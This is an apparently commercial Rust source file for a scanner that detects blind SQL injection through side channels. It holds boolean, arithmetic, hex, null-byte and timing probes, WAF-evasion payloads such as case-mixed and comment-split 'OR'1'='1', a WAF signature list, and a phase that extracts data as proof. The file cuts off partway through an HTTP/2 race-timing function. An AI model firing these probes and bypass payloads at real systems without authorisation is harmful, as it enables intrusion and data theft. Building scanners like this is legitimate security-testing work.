// Copyright (c) 2026 Bountyy Oy. All rights reserved.
//
// Side-Channel Analyzer
//
// High-level interface for probabilistic vulnerability detection
// without requiring out-of-band callbacks.

use crate::http_client::{HttpClient, HttpResponse};
use crate::inference::bayesian::{BayesianCombiner, CombinedResult, Signal, SignalType};
use crate::inference::signals::{ResonanceAnalyzer, SideChannelSuite};
use std::sync::Arc;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_native_tls::TlsConnector;
use tracing::{debug, info, warn};

/// Side-channel analyzer for blind vulnerability detection
pub struct SideChannelAnalyzer {
    http_client: Arc<HttpClient>,
    combiner: BayesianCombiner,
}

impl SideChannelAnalyzer {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self {
            http_client,
            combiner: BayesianCombiner::new(),
        }
    }

    /// Perform comprehensive side-channel analysis for SQL injection
    ///
    /// This is the main entry point for "no-OOB" blind SQLi detection.
    /// It combines multiple weak signals into a strong probabilistic inference.
    ///
    /// Flow:
    /// 1. Basic behavioral tests (quote, resonance, boolean, arithmetic)
    /// 2. If BooleanDifferential works → Extract data to PROVE SQLi
    /// 3. If uncertain → Advanced timing (MicroTimingLeak, RaceOracle)
    /// 4. If still uncertain → Definitive tests (TrueSinglePacket, CalibratedSleep)
    /// 5. Final combination with all evidence
    pub async fn analyze_sqli(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> SideChannelResult {
        info!(
            "[SideChannel] Analyzing {} parameter '{}' for blind SQLi",
            base_url, parameter
        );

        let mut all_signals: Vec<Signal> = Vec::new();

        // Initialize analyzers
        let suite = SideChannelSuite::new(baseline);
        let resonance = ResonanceAnalyzer::new(Arc::clone(&self.http_client));

        // ================================================================
        // PHASE 1: Quick behavioral tests
        // ================================================================

        // Test 1: Simple quote injection
        let quote_url = self.build_test_url(base_url, parameter, "'");
        if let Ok(quote_resp) = self.http_client.get(&quote_url).await {
            let signals = suite.analyze(&quote_resp);
            debug!("[SideChannel] Quote test signals: {:?}", signals.len());
            all_signals.extend(signals);
        }

        // Test 2: Resonance analysis (quote oscillation)
        let resonance_signal = resonance.analyze(base_url, parameter, baseline).await;
        debug!("[SideChannel] Resonance signal: P={:.2}", resonance_signal.probability);
        all_signals.push(resonance_signal);

        // Test 3: Boolean differential
        let bool_signals = self.analyze_boolean_differential(base_url, parameter, baseline).await;
        let has_boolean_diff = bool_signals.iter()
            .any(|s| s.signal_type == SignalType::BooleanDifferential && s.probability > 0.7);
        all_signals.extend(bool_signals);

        // Test 4: Arithmetic injection
        let arith_signals = self.analyze_arithmetic(base_url, parameter, baseline).await;
        all_signals.extend(arith_signals);

        // Test 5: Quote cancellation (value'' = value)
        let cancel_signals = self.analyze_quote_cancellation(base_url, parameter, baseline).await;
        all_signals.extend(cancel_signals);

        // Test 6: Comment injection (value-- = value)
        let comment_signals = self.analyze_comment_injection(base_url, parameter, baseline).await;
        all_signals.extend(comment_signals);

        // ================================================================
        // PHASE 2: If Boolean Differential works → PROVE it with extraction
        // This is the key innovation: don't just detect, PROVE!
        // ================================================================
        if has_boolean_diff {
            info!("[SideChannel] Boolean differential detected - attempting data extraction for PROOF");
            let extraction_signals = self.extract_data_proof(base_url, parameter, baseline).await;

            // If we extracted data, this is definitive proof
            let extraction_confirmed = extraction_signals.iter()
                .any(|s| s.signal_type == SignalType::DataExtraction && s.probability > 0.99);

            all_signals.extend(extraction_signals);

            if extraction_confirmed {
                // Early return - we have definitive proof
                let result = self.combiner.combine(&all_signals);
                info!(
                    "[SideChannel] CONFIRMED via data extraction: P={:.3} confidence={}",
                    result.probability, result.confidence
                );
                return SideChannelResult {
                    url: base_url.to_string(),
                    parameter: parameter.to_string(),
                    combined: result,
                    all_signals,
                };
            }
        }

        // ================================================================
        // PHASE 3: Encoding and WAF tests
        // ================================================================

        // Test 7: Hex encoding evaluation (0x61646D696E = admin)
        let hex_signals = self.analyze_hex_encoding(base_url, parameter, baseline).await;
        all_signals.extend(hex_signals);

        // Test 8: Null byte truncation (value%00garbage = value)
        let null_signals = self.analyze_null_byte(base_url, parameter, baseline).await;
        all_signals.extend(null_signals);

        // Test 9: WAF detection (use blocked payloads as oracle)
        let waf_signals = self.analyze_waf_behavior(base_url, parameter, baseline).await;
        all_signals.extend(waf_signals);

        // Test 10: Compression oracle
        let compression_signals = self.analyze_compression_oracle(base_url, parameter, baseline).await;
        all_signals.extend(compression_signals);

        // ================================================================
        // PHASE 4: Timing-based tests (if still uncertain)
        // ================================================================
        let current_prob = self.combiner.combine(&all_signals).probability;

        // Test 11: Micro-timing analysis (statistical, 20+ samples)
        if current_prob < 0.7 {
            let timing_signals = self.analyze_micro_timing(base_url, parameter).await;
            all_signals.extend(timing_signals);
        }

        // Test 12: Advanced micro-timing leak detection (50+ samples)
        let current_prob = self.combiner.combine(&all_signals).probability;
        if current_prob > 0.3 && current_prob < 0.8 {
            let leak_signals = self.analyze_micro_timing_leak(base_url, parameter).await;
            all_signals.extend(leak_signals);
        }

        // Test 13: HTTP/2 Race Oracle (response ordering, not timing)
        let current_prob = self.combiner.combine(&all_signals).probability;
        if current_prob > 0.4 && current_prob < 0.85 {
            let race_signals = self.analyze_race_oracle(base_url, parameter).await;
            all_signals.extend(race_signals);
        }

        // Test 14: Standard Single-Packet timing (burst timing)
        let current_prob = self.combiner.combine(&all_signals).probability;
        if current_prob > 0.5 && current_prob < 0.85 {
            let packet_signals = self.analyze_single_packet(base_url, parameter).await;
            all_signals.extend(packet_signals);
        }

        // ================================================================
        // PHASE 5: DEFINITIVE timing tests (for high-value confirmations)
        // ================================================================
        let current_prob = self.combiner.combine(&all_signals).probability;

        // Test 15: True Single-Packet Attack (raw TCP, microsecond precision)
        if current_prob > 0.5 && current_prob < 0.9 {
            let true_packet_signals = self.analyze_true_single_packet(base_url, parameter).await;
            all_signals.extend(true_packet_signals);
        }

        // Test 16: Calibrated SLEEP correlation (DEFINITIVE timing proof)
        let current_prob = self.combiner.combine(&all_signals).probability;
        if current_prob > 0.4 && current_prob < 0.95 {
            info!("[SideChannel] Running calibrated SLEEP correlation for definitive timing proof");
            let sleep_signals = self.analyze_calibrated_sleep(base_url, parameter).await;

            // Check if we got definitive confirmation
            let sleep_confirmed = sleep_signals.iter()
                .any(|s| s.signal_type == SignalType::CalibratedSleep && s.probability > 0.98);

            all_signals.extend(sleep_signals);

            if sleep_confirmed {
                let result = self.combiner.combine(&all_signals);
                info!(
                    "[SideChannel] CONFIRMED via SLEEP correlation: P={:.3} confidence={}",
                    result.probability, result.confidence
                );
                return SideChannelResult {
                    url: base_url.to_string(),
                    parameter: parameter.to_string(),
                    combined: result,
                    all_signals,
                };
            }
        }

        // ================================================================
        // FINAL: Combine all signals
        // ================================================================
        let result = self.combiner.combine(&all_signals);

        info!(
            "[SideChannel] Combined result: P={:.3} confidence={} signals={} classes={}",
            result.probability, result.confidence, result.signals_used, result.independent_classes
        );

        SideChannelResult {
            url: base_url.to_string(),
            parameter: parameter.to_string(),
            combined: result,
            all_signals,
        }
    }

    /// Analyze boolean differential (AND 1=1 vs AND 1=2)
    ///
    /// Statistical approach: measure EFFECT SIZE, not just threshold.
    /// Effect size = (mean_true - mean_false) / pooled_std
    async fn analyze_boolean_differential(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        // Get current parameter value
        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        let true_payload = format!("{} AND 1=1", current_value);
        let false_payload = format!("{} AND 1=2", current_value);

        let true_url = self.build_test_url(base_url, parameter, &true_payload);
        let false_url = self.build_test_url(base_url, parameter, &false_payload);

        // Run MULTIPLE samples to get statistical stability
        let n_samples = 3;
        let mut true_lengths: Vec<f64> = Vec::new();
        let mut false_lengths: Vec<f64> = Vec::new();

        for _ in 0..n_samples {
            let (true_resp, false_resp) = tokio::join!(
                self.http_client.get(&true_url),
                self.http_client.get(&false_url)
            );

            if let Ok(tr) = true_resp {
                true_lengths.push(tr.body.len() as f64);
            }
            if let Ok(fr) = false_resp {
                false_lengths.push(fr.body.len() as f64);
            }
        }

        if true_lengths.len() >= 2 && false_lengths.len() >= 2 {
            // Calculate effect size (Cohen's d)
            let mean_true: f64 = true_lengths.iter().sum::<f64>() / true_lengths.len() as f64;
            let mean_false: f64 = false_lengths.iter().sum::<f64>() / false_lengths.len() as f64;

            let var_true: f64 = true_lengths.iter()
                .map(|x| (x - mean_true).powi(2))
                .sum::<f64>() / (true_lengths.len() - 1) as f64;
            let var_false: f64 = false_lengths.iter()
                .map(|x| (x - mean_false).powi(2))
                .sum::<f64>() / (false_lengths.len() - 1) as f64;

            let pooled_std = ((var_true + var_false) / 2.0).sqrt().max(1.0);
            let effect_size = (mean_true - mean_false).abs() / pooled_std;

            // Check consistency: true should match baseline, false should differ
            let baseline_len = baseline.body.len() as f64;
            let true_matches_baseline = (mean_true - baseline_len).abs() / baseline_len.max(1.0) < 0.1;
            let false_differs = (mean_false - baseline_len).abs() / baseline_len.max(1.0) > 0.2;

            // Effect size interpretation (Cohen's d):
            // 0.2 = small, 0.5 = medium, 0.8 = large
            let probability = if effect_size > 2.0 && true_matches_baseline && false_differs {
                0.95  // Very large effect, correct pattern
            } else if effect_size > 1.0 && true_matches_baseline {
                0.85
            } else if effect_size > 0.8 {
                0.7
            } else if effect_size > 0.5 {
                0.55
            } else {
                0.25  // Small effect = likely noise
            };

            signals.push(Signal::new(
                SignalType::BooleanDifferential,  // Correct type!
                probability,
                effect_size,
                &format!(
                    "Boolean differential: effect_size={:.2} (true={:.0}±{:.0}, false={:.0}±{:.0})",
                    effect_size, mean_true, var_true.sqrt(), mean_false, var_false.sqrt()
                ),
            ));

            // Add NEGATIVE evidence if no effect detected
            if effect_size < 0.3 {
                signals.push(Signal::new(
                    SignalType::ConsistentBehavior,
                    0.8,  // High confidence in no difference
                    effect_size,
                    "No boolean differential detected (consistent behavior)",
                ));
            }
        }

        signals
    }

    /// Analyze arithmetic injection
    ///
    /// Tests if (value+1)-1 returns same as value, indicating SQL math evaluation.
    /// Uses multiple samples for statistical confidence.
    async fn analyze_arithmetic(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        // Get current parameter value
        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Only works for numeric values
        let num_value: i64 = match current_value.parse() {
            Ok(n) if n > 1 => n,
            _ => return signals,
        };

        // Run multiple arithmetic tests for stability
        let test_cases = [
            (format!("{}-1+1", num_value), "n-1+1"),     // Should equal n
            (format!("{}*1", num_value), "n*1"),         // Should equal n
            (format!("{}/1", num_value), "n/1"),         // Should equal n
        ];

        let mut matching_tests = 0;
        let mut total_effect = 0.0;

        for (payload, _desc) in &test_cases {
            let url = self.build_test_url(base_url, parameter, payload);

            // Multiple samples per test
            let mut similarities: Vec<f64> = Vec::new();
            for _ in 0..2 {
                if let Ok(resp) = self.http_client.get(&url).await {
                    let sim = self.calculate_similarity(baseline, &resp);
                    similarities.push(sim);
                }
            }

            if !similarities.is_empty() {
                let avg_sim: f64 = similarities.iter().sum::<f64>() / similarities.len() as f64;
                if avg_sim > 0.85 {
                    matching_tests += 1;
                    total_effect += avg_sim;
                }
            }
        }

        // Calculate overall probability based on how many tests matched
        let probability = match matching_tests {
            3 => 0.95,  // All three arithmetic tests match = very strong
            2 => 0.85,
            1 => 0.6,
            0 => 0.2,
            _ => 0.1,
        };

        if matching_tests > 0 {
            signals.push(Signal::new(
                SignalType::ArithmeticEval,  // Correct type!
                probability,
                total_effect / matching_tests as f64,
                &format!(
                    "Arithmetic evaluation: {}/{} tests matched (n={})",
                    matching_tests, test_cases.len(), num_value
                ),
            ));
        } else {
            // Add negative evidence
            signals.push(Signal::new(
                SignalType::NoChange,
                0.7,
                0.0,
                "Arithmetic expressions not evaluated",
            ));
        }

        signals
    }

    /// Analyze hex encoding evaluation
    ///
    /// Tests if 0x61646D696E returns same as 'admin'
    /// If SQL decodes hex, they'll match → SQLi confirmed
    async fn analyze_hex_encoding(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        // Get current parameter value
        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "admin".to_string());

        // Convert value to hex: 'admin' → 0x61646D696E
        let hex_value = format!("0x{}", current_value.bytes()
            .map(|b| format!("{:02x}", b))
            .collect::<String>());

        let hex_url = self.build_test_url(base_url, parameter, &hex_value);

        if let Ok(hex_resp) = self.http_client.get(&hex_url).await {
            let similarity = self.calculate_similarity(baseline, &hex_resp);

            if similarity > 0.85 {
                // Hex was decoded by SQL!
                signals.push(Signal::new(
                    SignalType::HexEncoding,
                    0.92,
                    similarity,
                    &format!("Hex encoding {} decoded to match baseline", hex_value),
                ));
            } else if similarity < 0.3 {
                // Different response - hex not decoded (normal)
                // No signal either way
            }
        }

        signals
    }

    /// Analyze null byte truncation
    ///
    /// Tests if value%00garbage returns same as value
    /// If SQL truncates at null, they'll match → SQLi indicator
    async fn analyze_null_byte(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "test".to_string());

        // Test: value%00garbage (null byte + junk)
        let null_payload = format!("{}%00randomjunk12345", current_value);
        let null_url = self.build_test_url(base_url, parameter, &null_payload);

        if let Ok(null_resp) = self.http_client.get(&null_url).await {
            let similarity = self.calculate_similarity(baseline, &null_resp);

            if similarity > 0.85 {
                // Null byte truncated the junk!
                signals.push(Signal::new(
                    SignalType::NullByteTrunc,
                    0.88,
                    similarity,
                    "Null byte truncation detected (junk after %00 ignored)",
                ));
            }
        }

        // Also test with actual null byte (not URL encoded)
        let null_payload2 = format!("{}\x00morejunk", current_value);
        let null_url2 = self.build_test_url(base_url, parameter, &null_payload2);

        if let Ok(null_resp2) = self.http_client.get(&null_url2).await {
            let similarity = self.calculate_similarity(baseline, &null_resp2);

            if similarity > 0.85 && signals.is_empty() {
                signals.push(Signal::new(
                    SignalType::NullByteTrunc,
                    0.85,
                    similarity,
                    "Raw null byte truncation detected",
                ));
            }
        }

        signals
    }

    /// Analyze WAF behavior as oracle
    ///
    /// If WAF blocks some payloads but not others, that tells us:
    /// 1. There IS a WAF (context info)
    /// 2. What the WAF thinks is dangerous (inverted signal)
    /// 3. What bypasses work (if bypass works + behavior change = likely vuln)
    async fn analyze_waf_behavior(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Test 1: Obviously malicious payload (should be blocked by WAF)
        let obvious_sqli = format!("{}'OR'1'='1", current_value);
        let obvious_url = self.build_test_url(base_url, parameter, &obvious_sqli);

        let obvious_resp = self.http_client.get(&obvious_url).await.ok();
        let obvious_blocked = obvious_resp.as_ref()
            .map(|r| self.is_waf_block(r))
            .unwrap_or(false);

        // Test 2: Evasion payload (might bypass WAF)
        let bypass_sqli = format!("{}'+oR+'1'='1", current_value);  // Case mixing
        let bypass_url = self.build_test_url(base_url, parameter, &bypass_sqli);

        let bypass_resp = self.http_client.get(&bypass_url).await.ok();
        let bypass_blocked = bypass_resp.as_ref()
            .map(|r| self.is_waf_block(r))
            .unwrap_or(false);

        // Test 3: Another evasion (inline comment)
        let bypass2_sqli = format!("{}'+/**/OR/**/+'1'='1", current_value);
        let bypass2_url = self.build_test_url(base_url, parameter, &bypass2_sqli);

        let bypass2_resp = self.http_client.get(&bypass2_url).await.ok();
        let bypass2_blocked = bypass2_resp.as_ref()
            .map(|r| self.is_waf_block(r))
            .unwrap_or(false);

        // Analyze WAF behavior patterns
        if obvious_blocked {
            // WAF is present and blocking SQLi
            signals.push(Signal::new(
                SignalType::WafBlock,
                0.6,  // WAF blocking = payload is "dangerous" (indirect evidence)
                1.0,
                "WAF detected: blocking obvious SQLi patterns",
            ));

            // Check if bypass worked
            if !bypass_blocked || !bypass2_blocked {
                // Bypass worked!
                if let Some(ref bypass_r) = bypass_resp {
                    if !bypass_blocked {
                        let sim = self.calculate_similarity(baseline, bypass_r);
                        if sim > 0.7 {
                            signals.push(Signal::new(
                                SignalType::WafBypass,
                                0.75,
                                sim,
                                "WAF bypass succeeded (case mixing)",
                            ));
                        }
                    }
                }

                if let Some(ref bypass2_r) = bypass2_resp {
                    if !bypass2_blocked {
                        let sim = self.calculate_similarity(baseline, bypass2_r);
                        if sim > 0.7 {
                            signals.push(Signal::new(
                                SignalType::WafBypass,
                                0.78,
                                sim,
                                "WAF bypass succeeded (inline comments)",
                            ));
                        }
                    }
                }
            }
        }

        signals
    }

    /// Check if response indicates WAF block
    fn is_waf_block(&self, resp: &HttpResponse) -> bool {
        // Common WAF block indicators
        if resp.status_code == 403 || resp.status_code == 406 || resp.status_code == 429 {
            return true;
        }

        let body_lower = resp.body.to_lowercase();

        // Common WAF signatures
        let waf_patterns = [
            "access denied",
            "forbidden",
            "blocked",
            "security violation",
            "waf",
            "firewall",
            "cloudflare",
            "akamai",
            "imperva",
            "incapsula",
            "sucuri",
            "mod_security",
            "request blocked",
            "suspicious activity",
        ];

        waf_patterns.iter().any(|p| body_lower.contains(p))
    }

    /// Micro-timing analysis using statistical methods
    ///
    /// Principle: SQL operations have timing signatures even without SLEEP()
    /// - String comparison: O(n) timing leak
    /// - Hash lookup vs table scan: 10-100μs difference
    /// - Index hit vs miss: measurable difference
    ///
    /// Challenge: Network jitter (10-50ms) >> SQL timing (10-100μs)
    /// Solution: Many samples + statistical analysis (Mann-Whitney U test)
    async fn analyze_micro_timing(
        &self,
        base_url: &str,
        parameter: &str,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Payload that should cause different DB behavior
        // Short string vs long string comparison (O(n) timing)
        let short_payload = format!("{}", current_value);
        let long_payload = format!("{}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", current_value);

        let short_url = self.build_test_url(base_url, parameter, &short_payload);
        let long_url = self.build_test_url(base_url, parameter, &long_payload);

        // Collect timing samples (alternating to reduce temporal bias)
        let n_samples = 20; // Balance between accuracy and speed
        let mut short_times: Vec<f64> = Vec::with_capacity(n_samples);
        let mut long_times: Vec<f64> = Vec::with_capacity(n_samples);

        for _ in 0..n_samples {
            // Alternate to reduce temporal correlation
            if let Ok(resp) = self.http_client.get(&short_url).await {
                short_times.push(resp.duration_ms as f64);
            }
            if let Ok(resp) = self.http_client.get(&long_url).await {
                long_times.push(resp.duration_ms as f64);
            }
        }

        if short_times.len() >= 10 && long_times.len() >= 10 {
            // Calculate statistics
            let short_mean = short_times.iter().sum::<f64>() / short_times.len() as f64;
            let long_mean = long_times.iter().sum::<f64>() / long_times.len() as f64;

            let short_var = short_times.iter()
                .map(|x| (x - short_mean).powi(2))
                .sum::<f64>() / (short_times.len() - 1) as f64;
            let long_var = long_times.iter()
                .map(|x| (x - long_mean).powi(2))
                .sum::<f64>() / (long_times.len() - 1) as f64;

            let short_std = short_var.sqrt().max(0.1);
            let long_std = long_var.sqrt().max(0.1);

            // Effect size (Cohen's d)
            let pooled_std = ((short_var + long_var) / 2.0).sqrt().max(0.1);
            let effect_size = (long_mean - short_mean).abs() / pooled_std;

            // Mann-Whitney U approximation via z-score
            // (Simplified: use t-test approximation for speed)
            let se = (short_var / short_times.len() as f64 + long_var / long_times.len() as f64).sqrt();
            let t_stat = if se > 0.0 { (long_mean - short_mean).abs() / se } else { 0.0 };

            // Consistency check: is the direction consistent?
            // Long payload should take LONGER if there's O(n) string comparison
            let direction_correct = long_mean > short_mean;

            // Calculate probability based on statistical significance
            let probability = if effect_size > 0.8 && t_stat > 2.5 && direction_correct {
                0.85  // Large effect, significant, correct direction
            } else if effect_size > 0.5 && t_stat > 2.0 && direction_correct {
                0.7   // Medium effect, significant
            } else if effect_size > 0.3 && t_stat > 1.5 {
                0.55  // Small effect, marginally significant
            } else {
                0.3   // No significant difference
            };

            if probability > 0.5 {
                signals.push(Signal::new(
                    SignalType::MicroTiming,
                    probability,
                    effect_size,
                    &format!(
                        "Micro-timing: short={:.1}ms±{:.1}, long={:.1}ms±{:.1}, d={:.2}, t={:.2}",
                        short_mean, short_std, long_mean, long_std, effect_size, t_stat
                    ),
                ));
            }
        }

        // Test 2: Compare baseline timing to payload timing
        // Check if SQLi payload causes timing anomaly
        let sqli_payloads = [
            format!("{}'", current_value),
            format!("{}--", current_value),
            format!("{} AND 1=1", current_value),
        ];

        let mut baseline_times: Vec<f64> = Vec::new();
        let mut payload_times: Vec<f64> = Vec::new();

        // Collect baseline samples
        for _ in 0..10 {
            if let Ok(resp) = self.http_client.get(base_url).await {
                baseline_times.push(resp.duration_ms as f64);
            }
        }

        // Collect payload samples
        for payload in &sqli_payloads {
            let url = self.build_test_url(base_url, parameter, payload);
            for _ in 0..5 {
                if let Ok(resp) = self.http_client.get(&url).await {
                    payload_times.push(resp.duration_ms as f64);
                }
            }
        }

        if baseline_times.len() >= 5 && payload_times.len() >= 5 {
            let baseline_mean = baseline_times.iter().sum::<f64>() / baseline_times.len() as f64;
            let payload_mean = payload_times.iter().sum::<f64>() / payload_times.len() as f64;

            let baseline_var = baseline_times.iter()
                .map(|x| (x - baseline_mean).powi(2))
                .sum::<f64>() / (baseline_times.len() - 1) as f64;

            // Check for timing anomaly (payload significantly slower OR faster)
            let z_score = (payload_mean - baseline_mean).abs() / baseline_var.sqrt().max(1.0);

            if z_score > 3.0 {
                // Significant timing difference with SQLi payloads
                let prob = if z_score > 5.0 { 0.75 } else { 0.6 };
                signals.push(Signal::new(
                    SignalType::MicroTiming,
                    prob,
                    z_score,
                    &format!(
                        "SQLi payload timing anomaly: baseline={:.1}ms, payload={:.1}ms, z={:.2}",
                        baseline_mean, payload_mean, z_score
                    ),
                ));
            }
        }

        signals
    }

    /// Advanced micro-timing leak detection
    ///
    /// Uses advanced Spectre-style timing analysis techniques:
    /// 1. Bottom-quartile filtering (fastest 25% as "clean" samples)
    /// 2. 50+ samples for statistical power
    /// 3. Bootstrapped confidence intervals
    /// 4. Adaptive thresholding using control requests
    /// 5. Strong negative evidence if no leak detected
    ///
    /// Detects:
    /// - O(n) string comparison timing leaks
    /// - Hash lookup vs table scan differences
    /// - Index hit vs miss (~10-100μs difference)
    async fn analyze_micro_timing_leak(
        &self,
        base_url: &str,
        parameter: &str,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // ================================================================
        // Phase 1: Establish baseline jitter via control requests
        // Send identical requests to measure network/server variance
        // ================================================================
        let control_url = self.build_test_url(base_url, parameter, &current_value);
        let mut control_times: Vec<f64> = Vec::with_capacity(20);

        for _ in 0..20 {
            if let Ok(resp) = self.http_client.get(&control_url).await {
                control_times.push(resp.duration_ms as f64);
            }
        }

        if control_times.len() < 10 {
            return signals; // Not enough samples
        }

        // Calculate baseline jitter (standard deviation of control)
        let control_mean = control_times.iter().sum::<f64>() / control_times.len() as f64;
        let control_var = control_times.iter()
            .map(|x| (x - control_mean).powi(2))
            .sum::<f64>() / (control_times.len() - 1) as f64;
        let jitter_std = control_var.sqrt();

        // Adaptive threshold: 3 sigma above jitter is significant
        let significance_threshold = jitter_std * 3.0;

        // ================================================================
        // Phase 2: String length timing leak (O(n) comparison)
        // Short vs long string should show linear time difference
        // ================================================================
        let short_payload = current_value.clone();
        let long_payload = format!("{}{}", current_value, "A".repeat(50));

        let short_url = self.build_test_url(base_url, parameter, &short_payload);
        let long_url = self.build_test_url(base_url, parameter, &long_payload);

        // Collect 50 samples each (alternating to reduce temporal correlation)
        let n_samples = 50;
        let mut short_times: Vec<f64> = Vec::with_capacity(n_samples);
        let mut long_times: Vec<f64> = Vec::with_capacity(n_samples);

        for _ in 0..n_samples {
            if let Ok(resp) = self.http_client.get(&short_url).await {
                short_times.push(resp.duration_ms as f64);
            }
            if let Ok(resp) = self.http_client.get(&long_url).await {
                long_times.push(resp.duration_ms as f64);
            }
        }

        if short_times.len() >= 30 && long_times.len() >= 30 {
            // Bottom-quartile filtering: use fastest 25% as "clean" samples
            short_times.sort_by(|a, b| a.partial_cmp(b).unwrap());
            long_times.sort_by(|a, b| a.partial_cmp(b).unwrap());

            let q1_idx = short_times.len() / 4;
            let short_q1: Vec<f64> = short_times[..q1_idx.max(5)].to_vec();
            let long_q1: Vec<f64> = long_times[..q1_idx.max(5)].to_vec();

            let short_clean_mean = short_q1.iter().sum::<f64>() / short_q1.len() as f64;
            let long_clean_mean = long_q1.iter().sum::<f64>() / long_q1.len() as f64;

            // Time difference in bottom quartile
            let timing_diff = long_clean_mean - short_clean_mean;

            // Bootstrap confidence interval (1000 resamples)
            let bootstrap_diffs = self.bootstrap_timing_diff(&short_q1, &long_q1, 500);
            let (ci_low, ci_high) = self.confidence_interval_95(&bootstrap_diffs);

            // Check if CI excludes zero (statistically significant)
            let ci_excludes_zero = ci_low > 0.0 || ci_high < 0.0;

            // Effect size on clean samples
            let short_var = short_q1.iter()
                .map(|x| (x - short_clean_mean).powi(2))
                .sum::<f64>() / short_q1.len().max(1) as f64;
            let long_var = long_q1.iter()
                .map(|x| (x - long_clean_mean).powi(2))
                .sum::<f64>() / long_q1.len().max(1) as f64;
            let pooled_std = ((short_var + long_var) / 2.0).sqrt().max(0.01);
            let effect_size = timing_diff.abs() / pooled_std;

            // Direction check: long should be slower for O(n) string comparison
            let direction_correct = timing_diff > 0.0;

            // Calculate probability based on multiple criteria
            let probability = if effect_size > 1.5 && ci_excludes_zero && direction_correct
                && timing_diff > significance_threshold {
                0.92  // Very strong evidence
            } else if effect_size > 1.0 && ci_excludes_zero && direction_correct {
                0.82  // Strong evidence
            } else if effect_size > 0.5 && direction_correct && timing_diff > jitter_std {
                0.65  // Moderate evidence
            } else if effect_size > 0.3 {
                0.45  // Weak evidence
            } else {
                0.2   // No evidence
            };

            if probability >= 0.6 {
                signals.push(Signal::new(
                    SignalType::MicroTimingLeak,
                    probability,
                    effect_size,
                    &format!(
                        "O(n) timing leak: diff={:.2}ms, d={:.2}, CI=[{:.2},{:.2}], jitter={:.2}ms",
                        timing_diff, effect_size, ci_low, ci_high, jitter_std
                    ),
                ));
            } else if probability < 0.3 && short_times.len() >= 40 {
                // Strong negative evidence: many samples, no difference
                signals.push(Signal::new(
                    SignalType::ConsistentBehavior,
                    0.85,  // High confidence in NO leak
                    effect_size,
                    &format!(
                        "No timing leak detected (n={}, d={:.2}, jitter={:.2}ms)",
                        short_times.len(), effect_size, jitter_std
                    ),
                ));
            }
        }

        // ================================================================
        // Phase 3: SQL-specific timing patterns
        // Test payloads that should cause different DB operations
        // ================================================================
        let test_payloads = [
            // Index hit vs miss (if numeric)
            (format!("{}", current_value), "baseline"),
            (format!("999999999{}", current_value), "index_miss"),
            // Hash collision potential
            (format!("{}' AND 'a'='a", current_value), "always_true"),
            (format!("{}' AND 'a'='b", current_value), "always_false"),
        ];

        let mut timing_results: Vec<(String, f64, f64)> = Vec::new();

        for (payload, label) in &test_payloads {
            let url = self.build_test_url(base_url, parameter, payload);
            let mut times: Vec<f64> = Vec::new();

            for _ in 0..15 {
                if let Ok(resp) = self.http_client.get(&url).await {
                    times.push(resp.duration_ms as f64);
                }
            }

            if times.len() >= 10 {
                times.sort_by(|a, b| a.partial_cmp(b).unwrap());
                let q1_mean = times[..times.len()/4].iter().sum::<f64>()
                    / (times.len()/4).max(1) as f64;
                let full_mean = times.iter().sum::<f64>() / times.len() as f64;
                timing_results.push((label.to_string(), q1_mean, full_mean));
            }
        }

        // Analyze timing differences between payloads
        if timing_results.len() >= 3 {
            // Compare always_true vs always_false (classic blind SQLi timing)
            let true_time = timing_results.iter()
                .find(|(l, _, _)| l == "always_true")
                .map(|(_, q1, _)| *q1);
            let false_time = timing_results.iter()
                .find(|(l, _, _)| l == "always_false")
                .map(|(_, q1, _)| *q1);

            if let (Some(t_true), Some(t_false)) = (true_time, false_time) {
                let diff = (t_true - t_false).abs();
                if diff > significance_threshold * 2.0 {
                    signals.push(Signal::new(
                        SignalType::MicroTimingLeak,
                        0.78,
                        diff / jitter_std.max(0.1),
                        &format!(
                            "Boolean blind timing: true={:.2}ms, false={:.2}ms, diff={:.2}ms",
                            t_true, t_false, diff
                        ),
                    ));
                }
            }
        }

        signals
    }

    /// HTTP/2 Race Oracle Analysis
    ///
    /// Advanced timing technique using HTTP/2 multiplexing:
    /// Instead of measuring absolute response times (which have network jitter),
    /// we measure the ORDER in which responses arrive.
    ///
    /// Principle:
    /// - HTTP/2 multiplexes requests over single TCP connection
    /// - Send two requests simultaneously (fast payload vs slow payload)
    /// - Observe which response arrives FIRST
    /// - No network jitter because both travel same path
    ///
    /// If short-string-comparison returns first 8/10 times → O(n) timing leak
    async fn analyze_race_oracle(
        &self,
        base_url: &str,
        parameter: &str,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Prepare "fast" and "slow" payloads
        // Fast: short string comparison (early exit)
        // Slow: long string that requires more processing
        let fast_payload = current_value.clone();
        let slow_payload = format!("{}{}", current_value, "X".repeat(64));

        let fast_url = self.build_test_url(base_url, parameter, &fast_payload);
        let slow_url = self.build_test_url(base_url, parameter, &slow_payload);

